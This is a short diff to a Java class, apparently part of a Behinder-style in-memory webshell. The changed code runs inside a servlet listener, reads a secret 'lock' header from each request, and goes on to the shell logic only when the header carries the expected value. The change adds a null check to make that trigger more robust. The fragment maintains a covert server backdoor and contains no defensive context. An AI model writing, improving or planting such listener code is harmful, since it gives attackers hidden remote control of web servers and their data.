@@ -37,7 +37,8 @@ public class ListenerBehinder implements InvocationHandler {
     private void run(Object sre) {
         try {
             Object request = invokeMethod(sre, "getServletRequest", new Class[]{}, new Object[]{});
-            if(!((String)invokeMethod(request, "getHeader", new Class[]{String.class}, new Object[]{lockHeaderKey})).contains(lockHeaderValue)) {
+            String lv = (String) invokeMethod(request, "getHeader", new Class[]{String.class}, new Object[]{lockHeaderKey});
+            if(lv == null || !lv.contains(lockHeaderValue)) {
                 return;
             }
             Object response = getResponse(request);
